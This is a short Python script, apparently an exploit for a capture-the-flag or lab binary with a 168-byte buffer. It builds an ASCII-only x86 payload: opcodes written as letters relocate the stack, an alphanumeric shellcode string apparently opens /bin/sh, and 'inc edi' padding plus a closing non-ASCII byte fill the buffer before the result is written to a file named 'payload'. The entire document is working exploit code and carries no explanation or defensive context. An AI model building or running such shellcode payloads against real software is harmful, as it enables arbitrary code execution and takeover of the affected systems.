class AsciiExploit(object):

    BUFFER_SIZE = 168

    PUSH_ESP = "T"
    POP_EAX = "X"
    PUSH_ECX = "Q"
    DEC_EAX = "H"
    ALPHANUMERIC_SHELLCODE = "j0X40PZRhXXshXf5wwPj0X4050binHPTXRQSPTUVWVXHf5sOf5A0PXaPYPZS4J4A"
    NOP = "G"  # inc edi

    NON_ASCII_CHAR = "\x05"

    def __init__(self):
        self.exploit_payload = ""

    @staticmethod
    def _xor_esp_at_offset_opcode(offset):
        return "3`" + chr(offset)

    def relocate_stack_to_buffer(self):
        self.exploit_payload += self.PUSH_ESP
        self.exploit_payload += self.POP_EAX
        self.exploit_payload += self.PUSH_ESP
        self.exploit_payload += self.PUSH_ECX
        self.exploit_payload += self.DEC_EAX * 0x28
        self.exploit_payload += self._xor_esp_at_offset_opcode(0x20)
        self.exploit_payload += self._xor_esp_at_offset_opcode(0x24)

    def craft_exploit_payload(self):
        self.relocate_stack_to_buffer()
        self.exploit_payload += self.ALPHANUMERIC_SHELLCODE
        self.exploit_payload = self.exploit_payload.ljust(self.BUFFER_SIZE - 1, self.NOP) + self.NON_ASCII_CHAR

    def run(self):
        self.craft_exploit_payload()
        with open("payload", "w") as f:
            f.write(self.exploit_payload)


if __name__ == '__main__':
    AsciiExploit().run()
